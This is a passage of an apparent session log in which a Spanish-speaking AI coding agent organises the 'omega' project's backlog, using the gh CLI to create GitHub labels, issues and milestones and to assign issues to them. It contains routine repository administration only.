Workflow de compuerta (qué consolidar), recall progresivo, y \"sueño\" (sesión de housekeeping que consolida, poda e integra). El sueño es simplemente otro `AgentConfig` corrido por el mismo `Runner`. Fases incrementales. También bosqueja workspaces multi-agente.\n\n### 6. `benchmarking-design.md` — Benchmarking de modelos\nDiseño para medir correctitud, costo y eficiencia de distintos modelos. Énfasis en: verificador automatizado (no ojo humano), métrica principal = pass/fail, estocasticidad (correr N veces por tarea), control de confounds, taxonomía de tareas (bug fix, feature, refactor, multi-archivo, read-heavy). Necesita modo headless + harness de corrida. Suite mínima propia + Aider como referencia.\n\n### 7. `manual-tests-11-10.md` — Pruebas manuales para SIGINT y ask_user\n10 pruebas paso a paso para verificar que Ctrl+C interrumpe limpiamente (sin perder sesión ni dejar terminal rota) y que `ask_user` funciona para confirmaciones destructivas, respuestas afirmativas/negativas/vacías, y combinación con SIGINT.\n\n---\n\n## Issues de GitHub (13 abiertas)\n\n| # | Título | Tipo | Relación con docs |\n|---|---|---|---|\n| 21 | TESTS: Componentes TUI sin cobertura | enhancement | `improvements.md` #14 |\n| 20 | DOCS: README desactualizado | documentation | `improvements.md` #25 |\n| 18 | FEAT: Selección de provider por config | enhancement | `improvements.md` #4 |\n| 16 | BUG: AnthropicProvider manda mensajes sin traducir | bug | `improvements.md` #18 |\n| 14 | TESTS: Cobertura de tests para componentes críticos | enhancement | `improvements.md` #2, #3 |\n| 13 | LIKE: Sistema de memoria/cabinet | enhancement | `memory-system-design.md` |\n| 12 | LIKE: Sandbox para bash execution | enhancement | `improvements.md` #13 |\n| 11 | LIKE: SIGINT para interrumpir al agente | enhancement | `improvements.md` #10, `manual-tests-11-10.md` |\n| 10 | LIKE: Modo plan / confirmación | enhancement | `improvements.md` #10, `harness-improvements.md` #3 |\n| 9 | LIKE: Ejecución paralela de tools independientes | enhancement | No documentado aún |\n| 7 | LIKE: Autocompletado de paths | enhancement | No documentado aún |\n| 8 | LIKE: Edición de mensajes previos | enhancement | No documentado aún |\n| 6 | LIKE: Modo diff (+/-) para edits | enhancement | `harness-improvements.md` #2 |\n\n---\n\n## Cruce docs vs issues: qué falta hacer\n\nLas issues reflejan bastante fielmente los items no resueltos de `improvements.md`. Los documentos de diseño (`harness-improvements.md`, `markdown-rendering-design.md`, `memory-system-design.md`, `benchmarking-design.md`) van más allá del backlog inmediato y plantean features grandes para el futuro.\n\n**Cosas que están en docs pero no tienen issue en GitHub:**\n- Renderizado de markdown (tiene diseño completo, sin issue)\n- Mejoras de harness (compaction, apply-patch, verificación en prompt: sin issues individuales)\n- Benchmarking / modo headless (sin issue)\n\n**Cosas que tienen issue pero no están documentadas en docs/:**\n- Ejecución paralela de tools (#9)\n- Autocompletado de paths (#7)\n- Edición de mensajes previos (#8)\n- Modo diff para edits (#6)\n\n¿Querés que trabaje en algo de todo esto?"
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": "lleva todo lo que falta a issues en Github asi podemos trabajar atomicamente en cada, hay alguna forma de agrupar issues en Github?"
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "¡Buen plan! Para agrupar issues GitHub ofrece **Labels**, **Milestones** y **Projects**. Lo más práctico: creamos un **Project** (tablero Kanban) llamado \"Omega Backlog\" donde cada columna sea un área (core, tools, TUI, tests, docs, etc.) y metemos todas las issues ahí. También podemos usar labels para categorizar.\n\nAntes de crear las issues, déjame mapear qué falta:"
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_WerAQqmqILhOUpxvm58C9884",
+          "name": "bash",
+          "input": {
+            "command": "gh label list --limit 30 2>/dev/null || echo \"Sin labels o gh no disponible\""
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_bfQlpYTTGEhaeShbj2AV7099",
+          "name": "bash",
+          "input": {
+            "command": "gh project list 2>/dev/null || echo \"Sin projects\""
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_WerAQqmqILhOUpxvm58C9884",
+          "content": "bug\tSomething isn't working\t#d73a4a\ndocumentation\tImprovements or additions to documentation\t#0075ca\nduplicate\tThis issue or pull request already exists\t#cfd3d7\nenhancement\tNew feature or request\t#a2eeef\ngood first issue\tGood for newcomers\t#7057ff\nhelp wanted\tExtra attention is needed\t#008672\ninvalid\tThis doesn't seem right\t#e4e669\nquestion\tFurther information is requested\t#d876e3\nwontfix\tThis will not be worked on\t#ffffff\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_bfQlpYTTGEhaeShbj2AV7099",
+          "content": "Sin projects\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Hay labels (`bug`, `enhancement`, `documentation`) pero no hay `tests` ni `chore`. Tampoco hay Projects. Te propongo:\n\n1. Crear labels `tests` y `chore`\n2. Crear las ~16 issues faltantes\n3. Crear un Project \"Omega Backlog\" para agruparlas visualmente\n\n¿Creo todo de una o preferís que primero te muestre la lista final de issues a crear para que valides?"
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": "Dale metele"
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Primero creo los labels que faltan, después las issues en lote."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_VOtxfoiDjOJzV7nnEHPp6217",
+          "name": "bash",
+          "input": {
+            "command": "gh label create \"tests\" --color \"0e8a16\" --description \"Tests y cobertura\" 2>&1"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_0l9EqWQT219g68ZwJHRZ1750",
+          "name": "bash",
+          "input": {
+            "command": "gh label create \"chore\" --color \"bfdadc\" --description \"Tareas de mantenimiento y refactor\" 2>&1"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_j18Bg64lzMF2TsntF4o66979",
+          "name": "bash",
+          "input": {
+            "command": "gh label create \"design\" --color \"5319e7\" --description \"Diseño y arquitectura\" 2>&1"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_VOtxfoiDjOJzV7nnEHPp6217",
+          "content": "",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_0l9EqWQT219g68ZwJHRZ1750",
+          "content": "",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_j18Bg64lzMF2TsntF4o66979",
+          "content": "",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Labels listos. Ahora creo las 17 issues en lote."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_Z8DYWVbEFrD2rKhFWo8x0723",
+          "name": "bash",
+          "input": {
+            "command": "cat << 'ISSUES' | while IFS='|' read -r title label body; do\n  gh issue create --title \"$title\" --label \"$label\" --body \"$body\"\ndone\nBUG: Runner no frena con stop_reason === \"tool_use\"|bug|`LLMResponse.stop_reason` incluye `\"tool_use\"` como valor posible, pero el runner solo frena con `\"end_turn\"` y `\"max_tokens\"`. Si un provider devuelve `\"tool_use\"` como stop_reason, el loop sigue hasta `maxSteps` innecesariamente.\n\n**Archivo:** `src/runner.ts`\n**Ref:** `docs/improvements.md` #19\nBUG: Non-null assertion en config.openrouterApiKey sin validación|bug|En `index.ts` se usa `config.openrouterApiKey!` sin validar que exista. Si la variable de entorno no está seteada, el error en runtime es oscuro.\n\n**Fix:** validar en `validateEnv()` con mensaje claro, o hacer selección de provider dinámica y exigir solo la key del provider elegido.\n\n**Archivo:** `src/index.ts`, `src/config.ts`\n**Ref:** `docs/improvements.md` #20\nBUG: Truncate afecta al modelo, no solo al display|bug|En `runner.ts`, `truncate(output, 200)` corta el output que se muestra al usuario y también el que se guarda en `toolResults` para el modelo. Si el output real era más largo (ej. un archivo de 500 líneas), el LLM solo ve 200 líneas.\n\n**Fix:** versión completa en el mensaje al modelo, truncada solo para display.\n\n**Archivo:** `src/runner.ts`\n**Ref:** `docs/improvements.md` #23\nISSUES"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_Z8DYWVbEFrD2rKhFWo8x0723",
+          "content": "/bin/sh: -c: line 20: syntax error: unexpected end of file\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Voy a crearlas de a una para evitar problemas de escaping."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_ffiU58ntrRLuVDdbqP114824",
+          "name": "bash",
+          "input": {
+            "command": "gh issue create --title \"BUG: Runner no frena con stop_reason === \\\"tool_use\\\"\" --label \"bug\" --body \"LLMResponse.stop_reason incluye \\\"tool_use\\\" como valor posible, pero el runner solo frena con \\\"end_turn\\\" y \\\"max_tokens\\\". Si un provider devuelve \\\"tool_use\\\" como stop_reason, el loop sigue hasta maxSteps innecesariamente.\n\nArchivo: src/runner.ts\nRef: docs/improvements.md #19\""
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_ffiU58ntrRLuVDdbqP114824",
+          "content": "https://github.com/belizar/omega/issues/24\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_BPqEej3cekn8EXuiMHZH5181",
+          "name": "bash",
+          "input": {
+            "command": "gh issue create --title \"BUG: Non-null assertion en config.openrouterApiKey sin validación\" --label \"bug\" --body \"En index.ts se usa config.openrouterApiKey! sin validar que exista. Si la variable de entorno no está seteada, el error en runtime es oscuro.\n\nFix: validar en validateEnv() con mensaje claro, o hacer selección de provider dinámica y exigir solo la key del provider elegido.\n\nArchivos: src/index.ts, src/config.ts\nRef: docs/improvements.md #20\""
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_BPqEej3cekn8EXuiMHZH5181",
+          "content": "https://github.com/belizar/omega/issues/25\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_DKyedhwThlkO1Cb0QNgq4520",
+          "name": "bash",
+          "input": {
+            "command": "gh issue create --title \"BUG: Truncate afecta al modelo, no solo al display\" --label \"bug\" --body \"En runner.ts, truncate(output, 200) corta el output que se muestra al usuario y también el que se guarda en toolResults para el modelo. Si el output real era más largo (ej. un archivo de 500 líneas), el LLM solo ve 200 líneas.\n\nFix: versión completa en el mensaje al modelo, truncada solo para display.\n\nArchivo: src/runner.ts\nRef: docs/improvements.md #23\""
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_DKyedhwThlkO1Cb0QNgq4520",
+          "content": "https://github.com/belizar/omega/issues/26\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Voy a crear el resto con un script para ir más rápido."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_Q2x9XhIswwMMvSaWRZUd7674",
+          "name": "write",
+          "input": {
+            "path": "/tmp/create-issues.sh",
+            "content": "#!/bin/bash\nset -e\n\n# TESTS\ngh issue create --title \"TESTS: Tests de EditTool\" --label \"tests\" --body \"EditTool no tiene tests, siendo la herramienta más delicada (matcheo exacto, detección de múltiples ocurrencias, archivos inexistentes).\n\nArchivo: src/tools/edit.ts\nRef: docs/improvements.md #26\"\n\ngh issue create --title \"TESTS: Tests de commands (/clear, dispatchCommand)\" --label \"tests\" --body \"No hay tests para los comandos slash ni para el dispatchCommand.\n\nArchivos: src/commands/clear.ts, src/commands/index.ts\nRef: docs/improvements.md #15\"\n\ngh issue create --title \"TESTS: Tests de context-management (truncate, pruneContext)\" --label \"tests\" --body \"truncate() y pruneContext() no tienen tests unitarios. Son funciones clave para mantener el contexto bajo control.\n\nArchivo: src/context-management.ts\nRef: docs/improvements.md #16\"\n\ngh issue create --title \"TESTS: Tests de Session — persistencia, reanudación, clear, info\" --label \"tests\" --body \"Los tests de Session existen pero son básicos. No cubren: persistencia (carga/guardado en disco), reanudación por id, clear(), info().\n\nArchivo: src/session.ts\nRef: docs/improvements.md #17\"\n\n# CHORE / ENHANCEMENT from improvements\ngh issue create --title \"CHORE: Tipar 'any' en runner y providers\" --label \"chore\" --body \"El runner y los providers usan `any` en varias partes: runner.ts castea la respuesta del LLM, los providers devuelven `unknown` o `any`. Hay que definir un tipo común `LLMResponse` que ambos providers implementen.\n\nArchivos: src/runner.ts, src/providers/openrouter-llm-provider.ts, src/providers/anthropic-llm-provider.ts\nRef: docs/improvements.md #1\"\n\ngh issue create --title \"ENH: Usar DisplayToolCall para mostrar tool calls\" --label \"enhancement\" --body \"La clase DisplayToolCall existe y está exportada pero nunca se instancia en index.ts. Cuando el runner usa una tool, imprime 'Usando tool: ...' como texto genérico.\n\nArchivos: src/tui/components/display-text.ts, src/index.ts\nRef: docs/improvements.md #7\"\n\ngh issue create --title \"ENH: Streaming (SSE) en llamadas al LLM\" --label \"enhancement\" --body \"La llamada al LLM es request/response completa. Con modelos grandes el usuario espera sin feedback. Streaming (SSE) mejoraría la experiencia. Requiere refactor del provider y del runner.\n\nArchivos: src/providers/, src/runner.ts\nRef: docs/improvements.md #12\"\n\ngh issue create --title \"ENH: Rotación de logs\" --label \"enhancement\" --body \"Los logs en .omega/logs/ se acumulan indefinidamente. No hay mecanismo de rotación ni cleanup automático. Con uso intensivo, el directorio crece sin control.\n\nArchivo: src/logger.ts\nRef: docs/improvements.md #27\"\n\n# ENHANCEMENTS from harness-improvements.md\ngh issue create --title \"ENH: Compaction/poda dentro del loop + descartar archivos ya usados\" --label \"enhancement\" --body \"El contexto se infla porque el modelo reenvía archivos leídos en cada paso. Agregar poda dentro del loop agéntico y reemplazar resultados de read viejos por marcadores como '[leído src/runner.ts antes — 200 líneas omitidas]'.\n\nImpacto: el más alto. Contexto más chico y filoso = mismo modelo se comporta mejor, degrada menos, cuesta menos.\n\nRef: docs/harness-improvements.md #1\"\n\ngh issue create --title \"ENH: Tool apply-patch / multi-edit + mejor feedback de error en edit\" --label \"enhancement\" --body \"El edit exige match exacto; si falla, el modelo re-lee el archivo entero y reintenta -> thrashing. Crear una tool que aplique varios edits a un archivo en una sola llamada (array de {oldText, newText}). Mejorar el error de edit devolviendo el match más cercano.\n\nImpacto: alto. Menos pasos, menos re-lecturas, menos errores que arrastran contexto.\n\nRef: docs/harness-improvements.md #2\"\n\ngh issue create --title \"ENH: Verificación de comportamiento en system prompt\" --label \"enhancement\" --body \"Agregar al system prompt: typecheck y tests son necesarios pero no suficientes. Para cambios de comportamiento (interactivos), escribir un plan de prueba manual de 2-3 pasos y pedírselo al usuario con ask_user antes de declarar la tarea terminada.\n\nImpacto: medio. El mismo modelo, con la instrucción correcta, distingue 'compila' de 'funciona'.\n\nEsfuerzo: trivial (solo texto en el prompt).\nRef: docs/harness-improvements.md #4\"\n\n# ENHANCEMENTS from design docs\ngh issue create --title \"ENH: Renderizado de Markdown en la TUI\" --label \"enhancement\" --body \"El output del assistant se muestra sin formato. El LLM responde en markdown (\\`**negrita**\\`, \\`\\`\\`codigo\\`\\`\\`, \\`### Titulo\\`) y se ve crudo. Parsear markdown y traducirlo a secuencias ANSI usando patrón Strategy (MarkdownRenderer -> AnsiRenderer / PlainTextRenderer).\n\nDiseño completo en docs/markdown-rendering-design.md.\n\nArchivos nuevos: src/tui/markdown/\nArchivos a modificar: src/tui/components/display-text.ts, src/index.ts\"\n\ngh issue create --title \"ENH: Autocompletado de paths en el editor\" --label \"enhancement\" --body \"El LineEditor no tiene autocompletado. Agregar Tab-completion para paths del filesystem, similar a como funciona en bash/zsh.\"\n\ngh issue create --title \"ENH: Modo headless para benchmarking de modelos\" --label \"enhancement\" --body \"Hoy omega es interactivo (TUI). Para benchmarkear modelos hay que correrlo no-interactivo: prompt de entrada -> corre hasta terminar -> emite JSON con métricas (success, cost, tokens, steps, toolCalls, durationMs, model).\n\nCasi todo ya se trackea en las métricas; falta exponerlo en formato máquina (JSON a stdout).\n\nRef: docs/benchmarking-design.md\"\n\ngh issue create --title \"ENH: Harness de corrida para benchmarks\" --label \"enhancement\" --body \"Por cada (tarea, modelo, repetición): resetear repo al checkpoint, correr omega headless, correr script de chequeo -> pass/fail, registrar fila. Salida: CSV/planilla para comparar modelos por tasa de éxito y medianas de costo/pasos.\n\nDepende de #modo-headless.\nRef: docs/benchmarking-design.md\"\n\necho \"Done!\"\n"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_Q2x9XhIswwMMvSaWRZUd7674",
+          "content": "Escrito /tmp/create-issues.sh correctamente.",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_EFYAlP4SNlICnlBAgjbA3620",
+          "name": "bash",
+          "input": {
+            "command": "bash /tmp/create-issues.sh"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_EFYAlP4SNlICnlBAgjbA3620",
+          "content": "https://github.com/belizar/omega/issues/27\nhttps://github.com/belizar/omega/issues/28\nhttps://github.com/belizar/omega/issues/29\nhttps://github.com/belizar/omega/issues/30\nhttps://github.com/belizar/omega/issues/31\nhttps://github.com/belizar/omega/issues/32\nhttps://github.com/belizar/omega/issues/33\nhttps://github.com/belizar/omega/issues/34\nhttps://github.com/belizar/omega/issues/35\nhttps://github.com/belizar/omega/issues/36\nhttps://github.com/belizar/omega/issues/37\nhttps://github.com/belizar/omega/issues/38\nhttps://github.com/belizar/omega/issues/39\nhttps://github.com/belizar/omega/issues/40\nhttps://github.com/belizar/omega/issues/41\nDone!\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "18 issues creadas. Ahora creo el Project para agruparlas todas."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_Xix81fDbewnmol1h4WxA3438",
+          "name": "bash",
+          "input": {
+            "command": "gh project create --title \"Omega Backlog\" --owner belizar 2>&1 || echo \"Probando con formato alternativo...\""
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_Xix81fDbewnmol1h4WxA3438",
+          "content": "error: your authentication token is missing required scopes [project read:project]\nTo request it, run:  gh auth refresh -s project,read:project\nProbando con formato alternativo...\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_Do0CG2iJsdKYMp0tTo0y5578",
+          "name": "ask_user",
+          "input": {
+            "question": "El token de GitHub CLI no tiene permisos para crear Projects. Necesito que ejecutes:\n\n  gh auth refresh -s project,read:project\n\n¿Lo ejecutás y después sigo?"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_Do0CG2iJsdKYMp0tTo0y5578",
+          "content": "(sin respuesta)",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "(El modelo no produjo contenido visible en este turno)"
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": "Continua"
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "No tengo permisos para crear el Project (el token necesita el scope `project`). Mientras tanto, puedo agrupar las issues usando **Milestones**, que no requieren scopes extra."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_EVrelyWWNUZDzMOUYaXS7111",
+          "name": "bash",
+          "input": {
+            "command": "gh api repos/belizar/omega/milestones --jq '.[].title' 2>/dev/null || echo \"Sin milestones\""
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_EVrelyWWNUZDzMOUYaXS7111",
+          "content": "",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_dQdvraD7Xced1JWTKWPb0544",
+          "name": "bash",
+          "input": {
+            "command": "gh api repos/belizar/omega/milestones -f title=\"Core & Runner\" -f description=\"Loop agéntico, providers, contexto, configuración\" -f state=\"open\" --silent 2>&1"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_dQdvraD7Xced1JWTKWPb0544",
+          "content": "",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_9y692ckUf1DrdLhwbAzC3620",
+          "name": "bash",
+          "input": {
+            "command": "gh api repos/belizar/omega/milestones -f title=\"Tools\" -f description=\"Read, write, edit, bash, ask_user y nuevas tools\" -f state=\"open\" --silent"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_hrjFiyPNojFpBzh6r8OI4107",
+          "name": "bash",
+          "input": {
+            "command": "gh api repos/belizar/omega/milestones -f title=\"TUI\" -f description=\"Editor de línea, renderizado, markdown, spinner, display\" -f state=\"open\" --silent"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_pE9bVs2vTQmcnpDtrxOE5450",
+          "name": "bash",
+          "input": {
+            "command": "gh api repos/belizar/omega/milestones -f title=\"Tests\" -f description=\"Cobertura de tests para componentes críticos\" -f state=\"open\" --silent"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_03_vXNQbAfWeXlYXeRq4UFd3860",
+          "name": "bash",
+          "input": {
+            "command": "gh api repos/belizar/omega/milestones -f title=\"Docs & DX\" -f description=\"Documentación, logs, comandos, experiencia de desarrollo\" -f state=\"open\" --silent"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_04_CxshN3hRqSwjGtEhLxV36438",
+          "name": "bash",
+          "input": {
+            "command": "gh api repos/belizar/omega/milestones -f title=\"Benchmarking\" -f description=\"Modo headless, harness de corrida, suite de tareas\" -f state=\"open\" --silent"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_9y692ckUf1DrdLhwbAzC3620",
+          "content": "",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_hrjFiyPNojFpBzh6r8OI4107",
+          "content": "",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_pE9bVs2vTQmcnpDtrxOE5450",
+          "content": "",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_03_vXNQbAfWeXlYXeRq4UFd3860",
+          "content": "",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_04_CxshN3hRqSwjGtEhLxV36438",
+          "content": "",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Milestones creados. Ahora consigo los IDs y asigno las issues."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_NmULbDlwb5GQf6Md5sZ13489",
+          "name": "bash",
+          "input": {
+            "command": "gh api repos/belizar/omega/milestones --jq '.[] | \"\\(.number) \\(.title)\"'"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_NmULbDlwb5GQf6Md5sZ13489",
+          "content": "1 Core & Runner\n2 Tools\n3 TUI\n4 Tests\n5 Docs & DX\n6 Benchmarking\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Ahora asigno cada issue a su milestone correspondiente. Voy por tandas:"
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_K3JXdgr33mLun4kgmpXA7382",
+          "name": "bash",
+          "input": {
+            "command": "gh issue edit 24 --milestone \"Core & Runner\" 2>&1\ngh issue edit 25 --milestone \"Core & Runner\" 2>&1\ngh issue edit 26 --milestone \"Core & Runner\" 2>&1\ngh issue edit 31 --milestone \"Core & Runner\" 2>&1\ngh issue edit 35 --milestone \"Core & Runner\" 2>&1\necho \"Core & Runner done\""
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_i3rEYT2jBhod2sYfq1wb2954",
+          "name": "bash",
+          "input": {
+            "command": "gh issue edit 36 --milestone \"Tools\" 2>&1\ngh issue edit 37 --milestone \"Tools\" 2>&1\ngh issue edit 32 --milestone \"Tools\" 2>&1\necho \"Tools done\""
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_7o2WY0PKo9TRogneQ1h96726",
+          "name": "bash",
+          "input": {
+            "command": "gh issue edit 38 --milestone \"TUI\" 2>&1\ngh issue edit 39 --milestone \"TUI\" 2>&1\ngh issue edit 33 --milestone \"TUI\" 2>&1\necho \"TUI done\""
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_03_fcJHIEiaxxqsRRvkzNuA7894",
+          "name": "bash",
+          "input": {
+            "command": "gh issue edit 21 --milestone \"Tests\" 2>&1\ngh issue edit 14 --milestone \"Tests\" 2>&1\ngh issue edit 27 --milestone \"Tests\" 2>&1\ngh issue edit 28 --milestone \"Tests\" 2>&1\ngh issue edit 29 --milestone \"Tests\" 2>&1\ngh issue edit 30 --milestone \"Tests\" 2>&1\necho \"Tests done\""
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_04_MrIgVjeLgNS3NyTciozN8502",
+          "name": "bash",
+          "input": {
+            "command": "gh issue edit 20 --milestone \"Docs & DX\" 2>&1\ngh issue edit 34 --milestone \"Docs & DX\" 2>&1\necho \"Docs & DX done\""
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_05_tk1v0VMShRa7qS2ljZP69951",
+          "name": "bash",
+          "input": {
+            "command": "gh issue edit 40 --milestone \"Benchmarking\" 2>&1\ngh issue edit 41 --milestone \"Benchmarking\" 2>&1\necho \"Benchmarking done\""
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_K3JXdgr33mLun4kgmpXA7382",
+          "content": "https://github.com/belizar/omega/issues/24\nhttps://github.com/belizar/omega/issues/25\nhttps://github.com/belizar/omega/issues/26\nhttps://github.com/belizar/omega/issues/31\nhttps://github.com/belizar/omega/issues/35\nCore & Runner done\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_i3rEYT2jBhod2sYfq1wb2954",
+          "content": "https://github.com/belizar/omega/issues/36\nhttps://github.com/belizar/omega/issues/37\nhttps://github.com/belizar/omega/issues/32\nTools done\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_7o2WY0PKo9TRogneQ1h96726",
+          "content": "https://github.com/belizar/omega/issues/38\nhttps://github.com/belizar/omega/issues/39\nhttps://github.com/belizar/omega/issues/33\nTUI done\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_03_fcJHIEiaxxqsRRvkzNuA7894",
+          "content": "https://github.com/belizar/omega/issues/21\nhttps://github.com/belizar/omega/issues/14\nhttps://github.com/belizar/omega/issues/27\nhttps://github.com/belizar/omega/issues/28\nhttps://github.com/belizar/omega/issues/29\nhttps://github.com/belizar/omega/issues/30\nTests done\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_04_MrIgVjeLgNS3NyTciozN8502",
+          "content": "https://github.com/belizar/omega/issues/20\nhttps://github.com/belizar/omega/issues/34\nDocs & DX done\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_05_tk1v0VMShRa7qS2ljZP69951",
+          "content": "https://github.com/belizar/omega/issues/40\nhttps://github.com/belizar/omega/issues/41\nBenchmarking done\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Falta asignar las issues preexistentes (las que ya estaban antes de hoy)."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_1JiOsbfGI2MG3weDxtvX7423",
+          "name": "bash",
+          "input": {
+            "command": "gh issue edit 18 --milestone \"Core & Runner\" 2>&1\ngh issue edit 16 --milestone \"Core & Runner\" 2>&1\ngh issue edit 11 --milestone \"Core & Runner\" 2>&1\ngh issue edit 9 --milestone \"Core & Runner\" 2>&1\ngh issue edit 13 --milestone \"Docs & DX\" 2>&1\ngh issue edit 12 --milestone \"Tools\" 2>&1\ngh issue edit 10 --milestone \"Tools\" 2>&1\ngh issue edit 6 --milestone \"Tools\" 2>&1\ngh issue edit 7 --milestone \"TUI\" 2>&1\ngh issue edit 8 --milestone \"TUI\" 2>&1\necho \"Legacy issues done\""
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_1JiOsbfGI2MG3weDxtvX7423",
